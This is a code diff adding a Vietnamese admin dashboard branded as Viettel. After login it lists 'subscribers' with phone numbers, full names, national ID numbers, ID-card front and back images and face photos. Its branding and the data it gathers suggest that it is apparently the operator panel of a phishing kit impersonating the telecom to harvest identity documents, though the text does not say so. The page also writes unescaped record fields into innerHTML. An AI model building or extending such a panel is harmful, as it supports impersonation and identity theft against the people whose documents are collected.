@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - Quản lý xác thực Viettel</title>
+    <link rel="stylesheet" href="/style.css">
+    <style>
+        .admin-header {
+            background: linear-gradient(135deg, #EE0434 0%, #C4012A 100%);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        .stat-card h3 { font-size: 28px; margin: 5px 0; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #EE0434; color: white; }
+        .status-badge {
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
+        .status-verified { background: #d4edda; color: #155724; }
+        .status-pending { background: #fff3cd; color: #856404; }
+        .login-form {
+            max-width: 400px;
+            margin: 50px auto;
+        }
+        .delete-btn { background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; }
+        .view-img { cursor: pointer; color: #EE0434; margin-right: 10px; }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+        }
+        .modal-content {
+            background: white;
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .modal img { width: 100%; border-radius: 8px; }
+        .close { float: right; font-size: 28px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div id="loginSection" class="container" style="max-width:400px;">
+        <div class="card">
+           <div class="logo">
+    <img src="/logo.png" alt="Viettel" style="height: 50px;">
+    <h1 style="font-size: 24px; margin-top: 10px;">Admin Viettel</h1>
+    <p>Đăng nhập hệ thống quản trị</p>
+</div>
+            <form id="loginForm">
+                <div class="form-group"><label>👤 Tên đăng nhập</label><input type="text" id="username" required></div>
+                <div class="form-group"><label>🔒 Mật khẩu</label><input type="password" id="password" required></div>
+                <button type="submit">🔓 Đăng nhập</button>
+            </form>
+            <div id="loginMsg" class="message"></div>
+            <hr><div class="footer"><a href="/">◀ Về trang chủ</a></div>
+        </div>
+    </div>
+
+    <div id="adminSection" style="display:none; padding:20px; max-width:1200px; margin:0 auto;">
+        <div class="admin-header">
+           <img src="/logo.png" alt="Viettel" style="height: 35px; vertical-align: middle;">
+        <span style="margin-left: 10px;">Admin</span>
+            <div><span>👋 Xin chào, <span id="adminName"></span></span> <button onclick="logout()" style="margin-left:15px; background:rgba(255,255,255,0.2); border:none; color:white; padding:8px 15px; border-radius:20px;">🚪 Đăng xuất</button></div>
+        </div>
+        <div class="stats" id="stats"></div>
+        <div class="card"><div class="table-container" style="overflow-x:auto;"><table id="subscribersTable"><thead><tr><th>ID</th><th>📱 SĐT</th><th>👤 Tên</th><th>🆔 CCCD</th><th>📅 Đăng ký</th><th>📊 Status</th><th>🖼️ Ảnh</th><th>⚡ Thao tác</th></tr></thead><tbody></tbody></table></div></div>
+    </div>
+
+    <div id="imageModal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal()">&times;</span><img id="modalImage" src=""></div></div>
+
+    <script>
+        let currentSubscribers = [];
+        
+        async function checkLogin() {
+            const res = await fetch('/api/admin-check');
+            const data = await res.json();
+            if (data.loggedIn) {
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('adminSection').style.display = 'block';
+                document.getElementById('adminName').innerText = data.name || 'Admin';
+                loadSubscribers();
+            }
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const res = await fetch('/api/admin-login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            });
+            const data = await res.json();
+            if (data.success) { checkLogin(); }
+            else { document.getElementById('loginMsg').innerHTML = '❌ ' + data.message; document.getElementById('loginMsg').className = 'message error'; }
+        });
+        
+        async function loadSubscribers() {
+            const res = await fetch('/api/subscribers');
+            currentSubscribers = await res.json();
+            const verified = currentSubscribers.filter(s => s.status === 'verified').length;
+            const pending = currentSubscribers.filter(s => s.status === 'pending').length;
+            document.getElementById('stats').innerHTML = `
+                <div class="stat-card"><div>👥</div><h3>${currentSubscribers.length}</h3><p>Tổng thuê bao</p></div>
+                <div class="stat-card"><div>✅</div><h3>${verified}</h3><p>Đã xác thực</p></div>
+                <div class="stat-card"><div>⏳</div><h3>${pending}</h3><p>Chờ xác thực</p></div>`;
+            
+            const tbody = document.querySelector('#subscribersTable tbody');
+            tbody.innerHTML = currentSubscribers.map(s => `
+                <tr>
+                    <td>${s.id}</td><td>${s.phone}</td><td>${s.fullname}</td><td>${s.identity_number}</td>
+                    <td>${new Date(s.created_at).toLocaleDateString()}</td>
+                    <td><span class="status-badge status-${s.status}">${s.status === 'verified' ? '✅ Đã xác thực' : '⏳ Chờ xác thực'}</span></td>
+                    <td><button class="view-img" onclick="showImages('${s.cccd_front}', '${s.cccd_back}', '${s.face_photo}')">🖼️ Xem</button></td>
+                    <td><button class="delete-btn" onclick="deleteSubscriber(${s.id})">🗑️ Xóa</button></td>
+                </tr>
+            `).join('');
+        }
+        
+        function showImages(front, back, face) {
+            const modal = document.getElementById('imageModal');
+            const img = document.getElementById('modalImage');
+            img.src = front || face;
+            modal.style.display = 'block';
+        }
+        
+        function closeModal() { document.getElementById('imageModal').style.display = 'none'; }
+        
+        async function deleteSubscriber(id) {
+            if (confirm('Bạn có chắc muốn xóa thuê bao này?')) {
+                await fetch(`/api/subscribers/${id}`, { method: 'DELETE' });
+                loadSubscribers();
+            }
+        }
+        
+        async function logout() {
+            await fetch('/api/admin-logout', { method: 'POST' });
+            window.location.reload();
+        }
+        
+        checkLogin();
+    </script>
+</body>
+</html>
